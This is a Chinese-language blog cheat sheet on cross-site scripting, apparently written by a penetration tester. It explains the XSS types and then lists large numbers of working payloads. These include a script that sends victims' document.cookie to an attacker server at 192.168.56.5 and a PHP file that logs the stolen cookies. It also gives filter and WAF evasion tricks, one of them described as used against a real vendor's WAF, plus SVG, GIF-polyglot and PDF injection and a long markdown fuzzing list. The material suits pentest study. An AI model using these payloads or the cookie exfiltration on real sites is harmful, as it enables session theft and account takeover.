---
title: XSS
author: Creexile
date: 2025-03-18 19:15:14
lastMod: 2026-01-25
summary: 'XSS,ctf没有,实战倒是不少'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [XSS, CTF]
---

# XSS

XSS(Cross Site Scripting, 跨站脚本攻击), 指的是将恶意代码语句嵌入到当前网页(反射型XSS)或存储到Web应用的数据库(存储型XSS)中, 引诱受害者访问含有恶意代码的网页, 使得恶意代码被执行

主要的目的有获取受害者cookie等登录凭证, 以此来获取操作权限

# 位置

留言板, 搜索框, 个人资料, 公告, 编辑器等

# 分类

分为反射型, 存储型, DOM型. 最大的不同可能是数据流经的路径不同

## 反射型

又称为非持久型, 参数型跨站脚本. 它需要欺骗用户自己去点击链接才能触发XSS代码

一般容易出现在搜索页面、输入框、URL参数处, 大多数是用来盗取用户的Cookie信息

数据流向为: 前端->后端->前端

## 存储型

又称为持久型跨站脚本, 它的代码是存储在服务器中的. 只需要受害者访问这个界面就会触发

一般出现在、评论、博客日志等于用户交互处, 容易造成蠕虫、盗窃cookie

数据流向: 前端–>后端–>数据库–>后端–>前端

## DOM型

DOM是指文档对象模型(Document Object Model), 处理可扩展标记语言的标准编程接口, 程序和脚本可以动态访问和修改文档的内容、结构和样式

DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，不经过后端，DOM-XSS是通过url传入参数去控制触发的, 其实也属于反射型XSS

**DOM-XSS不与后台交互**

数据流向: 前端->浏览器

# 利用

## 验证漏洞

尝试最基础的`利用HTML标签属性值执行XSS`, 看看是否存在漏洞

```HTML
<!-- 通过javascript:[code]伪协议形式编写恶意脚本 -->
<img src="javascript.:alert('1')">
```

然后可以`利用<>标记注射HTML、JavaScript`用于获取当前用户的cookie.

这段代码将访问的用户的cookie将其作为参数拼接到请求中并进行一次访问. 你开设的服务器要有http服务用于接收请求

```HTML
<script>var myimg = new Image(); myimg.src = 'http://192.168.56.5/?q=' + document.cookie;</script>
```

真实情况下, 需要被按到的时候才会触发, 靶机一般会有bot帮你自动触发

还有一些简单的案例

```html
<!-- 利用基本的script标签来弹窗-->
<script>alert('xss')</script>

<!-- 利用iframe标签的src属性来弹窗-->
<iframe src=javascript:alert('xss')></iframe>

<!-- 利用标签的href属性来弹窗-->
<a href=javascript:alert('xss')></a>

<!-- 利用img标签的onerror事件来弹窗,当装载文档或图像发生错误时触发onerror事件-->
<img src=1 onerror=alert('xss')>

<!-- 利用img标签的onclick事件来弹窗,只要点击鼠标就会触发弹窗事件-->
<img src=“http://www.baidu.com/img/logo.gif” οnclick=alert('xss')>

<script>alert(1)</script>
<img scr=1 onerror=alert(1)>
<svg onload=alert(1)/>
<a href=javascript:alert(1)>xss</a>
11<details/open/ontoggle="top['\u0061l\u0065rt'](1)">
```

> 加载图像成功触发onload, 加载图像失败触发onerror

## 反弹Cookie

**本地XSS**最常见的方法是调用`alert(document.cookie)`实现

```html
<script>
  alert(document.cookie)
</script>
```

**服务器反弹cookie**

```html
<script>
  document.location = 'http://127.0.0.1/?cookie=' + document.cookie
</script>

<script>
  alert((document.location = 'http://127.0.0.1/?cookie=' + document.cookie))
</script>
```

当然可以写一个php文件用于接收, 但是直接开一个python简易服务器就能满足大部分需要

```php
<?php
// 将得到的内容写进cookie.lst
 $file=fopen("cookie.lst","a");

 if($_GET['cookie']){
    $cookie=$_GET['cookie'];
    fputs($file,"$cookie\r\n");
 }
?>
```

# 绕过

## 利用HTML标签的属性值(伪协议)

```HTMl

<a href="javascript:alert(/xss/)">touch me!</a>
<img src="javascript:alert('xss')">		(IE6生效)
<img src=" javascript:alert('xss')">
```

## 利用[事件](https://www.w3school.com.cn/tags/html_ref_eventattributes.asp)

- windows事件: windows对象触发的事件
- From事件: HTML表单内动作触发事件
- Keyboard事件: 键盘按键
- Mouse事件: 鼠标或类似用户触发的事件
- Media事件: 多媒体触发的事件

```html
<img src='./smile.jpg' onmouseover='alert(/xss/)'>
<input type="text" onclick="alert(/xss/)">
<img src="#" onerror=alert(/xss/)>
<input type="button" value="click me" onclick="alert('xss')" />
```

## 利用CSS

```html
<!-- 引入外部样式 -->
<link rel="stylesheet" type="text/css" href="./xss.css" />

<style>
  @import 'javascript:alert(/xss/)';
</style>

<!-- 利用旧的css属性, expression执行js代码 -->
<div style="width:expression(alert(/xss/))">
  <div style="width:expression(alert('XSS'));">
    <img src="#" style="xss:expression(alert(/xss/));" />

    <!-- 利用background-image属性执行js代码 -->
    <div style="background-image:url(javascript:alert('xss'))">
      <style>
        body {
          background-image: url('javascript:alert(/xss/)');
        }
      </style>

      <!-- 两个一起用 -->
      <style>
        body {
          background-image: expression(alert('xss'));
        }
      </style>

      <!-- list-style-image允许使用图像url, 利用其执行js代码 -->
      <div style="list-style-image:url(javascript:alert('XSS'));"></div>
    </div>
  </div>
</div>
```

## 大小写

```html
<img src="#" Onerror="alert(/xss/)" />
<a href="javaScript:alert(/xss/)">click me</a>
<img src="JaVasCript:alert(0);" />
<img src="javascript:alert(0);" />
```

## 引号

HTML可以不用引号,js可以用反引号代替单双引号

```html
<img src="#" onerror="alert(/xss/)"/>
<img src='#' onerror='alert(/xss/)'/>
<img src=# onerror=alert(/xss/) />
<img src="#" onerror=alert(`xss`)/>
<img src="#" onerror=alert`xss`/>
<img src='javascript:alert(0);'>
<img src=javascript:alert(0);>
```

## 空格

```html
<img/src='#'/onerror='alert(/xss/)' />
<img/src="javascript:alert('xss');">
```

## Tab和回车

添加Tab和回车绕过关键词检测

```html
<img src='#' onerror	='alert(/xss/)' />
<a href="j	avascript:alert(/xss/)">click me</a>
<A href="j
avascript:alert(/xss/)">click me</a>
```

## 绕过JavaScript限制

用`maxsize`限制长度为10，用`pattern`限制内容只能是大小写字母

你以为单开是为什么, 原因在于HTML编码; 可能会有一个js专门处理<和>, 分别替换为`&lt;`和`&gt;`; 方法是去掉js中这部分代码

> 我寻思如果直接修改数据包好像也可以绕过啊, 反正试试吧

## 其他

```html
<!-- 构造不同的全角字符: -->
<div style="{left:ｅｘｐｒｅｓｓｉｏｎ(alert('xss'))">
  <!-- 利用注释符-->
  <div style="wid/**/th:expre/*xss*/ssion(alert('xss'));">
    <!-- \和\0– -->
    <style>
      @imp \0ort 'java\0scri\pt:alert(/xss/)';
    </style>

    <style>
      @imp \ort 'ja\0va\00sc\000ri\0000pt:alert(/xss/)';
    </style>

    <!-- CSS关键字转码 -->
    <div style="xss:\65xpression(alert('XSS'));">
      <div style="xss:\065xpression(alert('XSS'));">
        <div style="xss:\0065xpression(alert('XSS'));"></div>
      </div>
    </div>
  </div>
</div>
```

```html
<!--<img src="--><img src=x οnerrοr=alert(1)//">

<comment><img src="</comment><img src=x οnerrοr=alert(1)//">

<style><img src=“</style><img src=x onerror=alert(1)//”>
```

```html
<!-- 构造JS脚本使标签闭合绕过get传来的参数 var $a = “<?php echo $_GET["name"]; ?>”; -->
</script><script>alert('Eastmount')</script>
1";</script><img scr=1 οnerrοr=alert(‘Eastmount’)><script>

<!-- 绕过字符转义htmlentities($_GET[“name”]) -->
’;alert(‘Eastmount’);'
Eastmount’;alert($a);//

<!-- 利用$_SERVER[‘PHP_SELF’]绕过字符转义htmlentities()函数 -->
/"><script>alert('Eastmount')</script>"< "
/"><img src=1 οnerrοr=alert('Eastmount')><form

<!-- 绕过URL锚点(#)连接 -->
http://localhost/xss/xss9.php#<script>alert('Eastmount')</script>
```

## 组合svg

```html
<img
  src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert(1)%22%2F%3E"
/>
```

## 利用图像属性

```html
<img src="valid.jpg" onerror="eval(atob('YWxlcnQoJ1hTUycp'))" style="display:none" />
```

## 多阶段攻击

```html
<img src="/uploads/1.gif" onerror="loadNext()" />
<script>
  // 即使被CSP阻止也不影响
  function loadNext() {
    var img = new Image()
    img.onerror = function () {
      stealData()
    }
    img.src = '/uploads/2.gif'
  }
</script>
```

## 关键词过滤绕过

大小写绕过, 编码绕过, 更换关键词绕过

```html
<scrscriptipt>alert(/xss/)</scrscriptipt>
<sc<script>ript>alert('xss')</s</script>cript>
```

html实体编码

```html
<a href="j&#97;v&#x61;script:alert(/xss/)">click me</a>
```

url编码

ASCII编码

```html
<img src="javascript:alert('xss');">
<!-- 替换如下, t的ASCII码值为116，用”&#116”表示, :则表示&#58-->
<img src="javascrip&#116&#58alert('xss');">
<!-- 再进一步替换：-->
<img src="javascrip&#000116&#00058alert('xss');">
```

十进制

```html
<!-- <img src="javascript:alert('xss');"> -->
<img src="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97& #108&#101&#114&#116&#40&#39&#120&#115&#115&#39&#41&#59">
```

十六进制

```html
<!-- <img src="javascript:alert('xss');"> -->
<img src="&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&# x61&#x6c&#x65&#x72&#x74&#x28&#x27&#x78&#x73&#x73&#x27&#x29&#x3b">
```

字符编码`eval()`函数, `eval()`和`string.fromCharCode()`函数过滤

```html
<script>
  eval('\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29')
</script>

<img src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))" />
```

一些过滤: [有广告的文章](https://blog.csdn.net/yy17111342926/article/details/145986308)

对于alert过滤: [记录一次某客户系统的漏洞挖掘](https://www.sqlsec.com/2019/11/vul1.html#XSS)

```html
<img src="x" onerror="prompt(1)" /> xsspayload<img src="x" onerror="confirm(1)" />
```

## 字符串拼接 + 动态属性访问 + 替代函数

```javascript
c = 1
top['ale' + 'rt'].call(null, c)
```

这个xss只需要更换外壳即可

```html
<img src=\"x\" onerror=\"c='coo'+'kie';top['ale'+'rt'].call(null,document[c])\">

<script>
c=1;top['ale'+'rt'].call(null,c)
</script>

<img src=x onerror="c=1;top['ale'+'rt'].call(null,c)">
```

解析如下:

- **top对象: **

表示浏览器窗口层级中的最顶层窗口, 在 XSS 上下文中, 直接访问顶级窗口对象可绕过框架限制; 即使页面嵌入在 iframe 中, `top` 也能访问主窗口的方法

- **动态属性访问**

```javascript
top['ale' + 'rt']
```

通过字符串拼接 `'ale' + 'rt'` 生成完整方法名 `'alert'`
使用方括号语法访问对象属性，规避字符串过滤
等价于 `top.alert`，但避免了直接出现 "alert" 完整字符串

- **函数调用**

```javascript
.call(null, c)
```

`Function.prototype.call()` 是 JavaScript 核心方法:
第一个参数 `null` 设置函数执行上下文（ `this` 值）, 第二个参数 `c` 作为实参传递给函数;
最终执行效果等价于 `alert(c)` , 你想要弹出什么你就填进去, 或者给c赋值

首先规避了关键词的出现, 同时JavaScript允许通过字符串动态访问对象属性, 这个是无法被完全禁用的

# 拓展

## markdown编辑器

> 具体情境具体分析

[HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html)

插入超链接如下, 会被转成 HTML 代码:

```
[click](https://www.baidu.com)
=>
<a href="https://www.baidu.com/">Click Me</a>
```

对于图片的 markdown 语法则如下:

```
![a](http://example.com/1.png)
=>
<img src="http://example.com/1.png" alt="a">
```

### 伪协议->超链接

在没有明显过滤的情况下直接插入 XSS 代码会被解析为超链接, 点击后弹窗

```html
<a href="javascript:prompt(document.cookie)">a</a>
```

利用 Markdown 语法进行插入

> 小括号不能被解析, 于是用的反引号; XSS 编码绕过似乎也有说法

```markdown
[s](javascript:alert`1`)
[a](<javascript:prompt(document.cookie)>)

<!-- Other links attacks with some bypasses -->

[Basic](<javascript:alert('Basic')>)
[Local Storage](<javascript:alert(JSON.stringify(localStorage))>)
[CaseInsensitive](<JaVaScRiPt:alert('CaseInsensitive')>)
[URL](<javascript://www.google.com%0Aalert('URL')>)
[In Quotes](<'javascript:alert("InQuotes")'>)
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

### 插入图片

同样是没有明显过滤的情况下, 直接插入 XSS 代码即可

```html
<img src="https://example.com" onerror="alert(1)" />
```

符合 markdown 格式的:

```markdown
![Uh oh](<"onerror="alert('XSS')>)
![Uh oh](<https://www.example.com/image.png"onload="alert('XSS')>)
![Escape SRC - onload](<https://www.example.com/image.png"onload="alert('ImageOnLoad')>)
![Escape SRC - onerror](<"onerror="alert('ImageOnError')>)
```

有的时候需要逃逸出src属性或者alt属性当中的双引号, 然后直接在后面接上 `onerror` 等属性即可构造 xss

理论没输过, 实战没成过

```markdown
逃逸alt
![12" onerror=alert(1)](https://example.com/1.png)

逃逸src:
![12](https://www.baidu.com/1.png" onerror=alert(1)//)
```

## 延长XSS生命周期

[【XSS】延长 XSS 生命期（已过时）](https://www.cnblogs.com/index-html/p/xss_long_live.html)

## PDF XSS

> PDF注入值得新开一篇文章

1. 新建一个空的 PDF, 对着空白界面右键, 选择属性
2. 页面属性中, 动作栏中有一个打开界面时的操作, 打开时编辑动作列表
3. 新增->运行 JavaScript
4. 写入 XSS, 如下所示, 点击确定, 最后另存为即可

```JavaScript
app.alert(1)
```

制作 PDF 文件后直接用浏览器打开能触发 XSS, 目的当然是让网站在线解析我们制作的 PDF

如果你不喜欢还可以换一个方式, 比如用python

```python
from PyPDF2 import PdfReader, PdfWriter
# 创建一个新的 PDF 文档
output_pdf = PdfWriter()
# 添加一个新页面
page = output_pdf.add_blank_page(width=72, height=72)
# 添加js代码
output_pdf.add_js("app.alert('xss');")
# 将新页面写入到新 PDF 文档中
with open("alert.pdf", "wb") as f:
    output_pdf.write(f)
```

> 我想这里如果是能执行任意 js 代码, 能不能扩大化利用呢

## 文件上传XSS

[文章](https://cloud.tencent.com/developer/article/1165636)

### 文件名

文件名本身可能会反映在页面上, 所以一个带有XSS命名的文件便可以起到攻击作用

### 修改文件后缀

能上传 `.html` 和 `.htm` , 在文件内容当中插入 XSS 代码

### svg中写入 (Content)

如果网站支持svg格式的文件进行上传的话, 可以上传带有XSS的svg文件

> SVG（Scalable Vector Graphics）是一种用于描述二维矢量图形的 XML 格式文件, 可嵌入JavaScript (严格地说, 应该是ECMAScript) 脚本来控制SVG对象

将下面的代码修改为 svg 后缀即可, 上传后访问即可触发

```html
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
  <script>
    alert(1)
  </script>
</svg>
```

svg作为脚本也可以正常触发

```html
<script src="1.svg"></script>
```

### exif写入 (Metadata)

> EXIF (Exchangeable Image File Format)是一种嵌入在图片文件(如 JPEG, RAW)中的元数据标准, 用于记录拍摄时的设备参数和环境信息; **需要网站解析图片的exif信息才可以使用此方法**

不过都可以试试, 插入js的方式是利用exiftool

```powershell
exiftool -Comment="<script>alert(1)</script> filename.png"
```

### GIF中写入

建立一个携带有JavaScript payload的GIF图像用作一个脚本的源, 这种技术通常被称为`GIF-JavaScript Polyglot`或`图像JS注入`, 是一种将JavaScript代码嵌入到看似正常的GIF图像文件中的方法

这对绕过CSP (内容安全策略) 保护 `script-src 'self'` 是很有用的, 但前提是我们能够成功地在相同的域注入

**原理概述**

当CSP设置为`script-src 'self'`时：

1. 允许加载同源域的脚本文件
2. 阻止内联脚本 (如 `<script>alert(1)</script>` )
3. 阻止外部域的脚本

攻击者可以通过：

1. 在同源域上传一个恶意构造的GIF文件 (实际是JS/GIF polyglot)
2. 通过标签引用这个GIF文件
3. 浏览器将其作为脚本执行 (因为来自"self")

下面是一个简单的GIF文件, 保存为gif即可

```
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
```

> 文件类unix命令和PHP函数中的 `exif_imagetype()` 和 `getimagesize()` 会将其识别为一个GIF文件

最终引用需要script标签

```html
<script src="/uploads/malicious.gif"></script>
```

# 情景

## 结合XFF和日志界面

如果存在X-Forwarded-For伪造(这个是低危漏洞)且该系统拥有关于日志的界面(比如说用户操作日志, 反正就是日志经过处理显示在前端的), 可以尝试XSS

> X-Forwarded-For（XFF）是一个 HTTP 扩展头部，用于标识客户端通过代理服务器的真实 IP 地址。攻击者可通过直接修改该头部值伪造客户端来源 IP（例如隐藏恶意 IP 或绕过基于 IP 的访问限制），导致服务端误判请求来源。

方法很简单, 利用保存日志时XFF的内容作为IP被写入(且一般日志的读取和保存不会有针对性的waf), 在关于日志的界面被拉出来渲染/执行, 就可以触发XSS甚至RCE

对于`h****ei`的waf, 我用了下面这个方法绕过

```html
<details open ontoggle="c=1;top['ale'+'rt'].call(null,c)"></details>
```

waf测试如下:

```
被过滤
<svg/onload>
<img src/onerror=>
<script>
<input/onfocus=>
<alert()>
eval

未被过滤
<img/src=x >
<img src/onerror>
<input/onfocus>
<onload>
<onload=>
<onload=(1)/>
<alert>
```

没有对空格过滤, 但是对特定组合有过滤
似乎是对特定属性存在过滤, 不允许有值, 那就是黑名单

但是, 完全不止, 因为插入多长都没有问题, 所以可以写进去一个完整的html, 甚至能塞个上传点, 记录下肯定有用

## 结合下拉框

就算界面存在实体化, 但是对于一些下拉列表就不一定有

所以可以在列表读取的地方插入xss, 然后通过下拉列表触发

比如说我这里有一堆项目, 而隔壁管理功能需要用下拉列表选择项目然后再进行管理. 此时我在项目中插入, 在下拉列表处触发

## 结合审核功能

构造一个用户名是一个 XSS 攻击的申请, 审核员点击通过的时候就可能触发XSS

## 利用基于AngularJS的XSS实现提权

https://www.freebuf.com/articles/web/213783.html

# Fuzzing

```html
<!--
Fuzzing examples from
- https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt
- https://makandracards.com/makandra/481451-testing-for-xss-in-markdown-fields
-->

[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
![a](javascript:prompt(document.cookie))\
<javascript:prompt(document.cookie)>
<javascript:alert('XSS')>
  ![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:alert('XSS'))
![a'"`onerror=prompt(document.cookie)](x)\
[citelol]: (javascript:prompt(document.cookie))
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[test](javascript://%0d%0aprompt(1))
[test](javascript://%0d%0aprompt(1);com)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[clickme](vbscript:alert(document.domain))
_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
<http://\<meta\ http-equiv=\"refresh\"\ content=\"0;\ url=http://danlec.com/\"\>>
[text](http://danlec.com " [@danlec](/danlec) ")
[a](javascript:this;alert(1))
[a](javascript:this;alert(1&#41;)
[a](javascript&#58this;alert(1&#41;)
[a](Javas&#99;ript:alert(1&#41;)
[a](Javas%26%2399;ript:alert(1&#41;)
[a](javascript:alert&#65534;(1&#41;)
[a](javascript:confirm(1)
[a](javascript://www.google.com%0Aprompt(1))
[a](javascript://%0d%0aconfirm(1);com)
[a](javascript:window.onerror=confirm;throw%201)
[a](javascript:alert(document.domain&#41;)
[a](javascript://www.google.com%0Aalert(1))
[a]('javascript:alert("1")')
[a](JaVaScRiPt:alert(1))
![a](https://www.google.com/image.png"onload="alert(1))
![a]("onerror="alert(1))
</http://<?php\><\h1\><script:script>confirm(2)
[XSS](.alert(1);)
[ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
[ ](http://a?p=[[/onclick=alert(0) .]])
[a](javascript:new%20Function`al\ert\`1\``;)
[XSS](javascript:prompt(document.cookie))
[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[XSS](javascript:alert('XSS'))
[XSS]: (javascript:prompt(document.cookie))
[XSS](javascript:window.onerror=alert;throw%20document.cookie)
[XSS](javascript://%0d%0aprompt(1))
[XSS](javascript://%0d%0aprompt(1);com)
[XSS](javascript:window.onerror=alert;throw%20document.cookie)
[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[XSS](vbscript:alert(document.domain))
[XSS](javascript:this;alert(1))
[XSS](javascript:this;alert(1&#41;)
[XSS](javascript&#58this;alert(1&#41;)
[XSS](Javas&#99;ript:alert(1&#41;)
[XSS](Javas%26%2399;ript:alert(1&#41;)
[XSS](javascript:alert&#65534;(1&#41;)
[XSS](javascript:confirm(1)
[XSS](javascript://www.google.com%0Aprompt(1))
[XSS](javascript://%0d%0aconfirm(1);com)
[XSS](javascript:window.onerror=confirm;throw%201)
[XSS](�javascript:alert(document.domain&#41;)
![XSS](javascript:prompt(document.cookie))\
![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
![XSS'"`onerror=prompt(document.cookie)](x)\

```
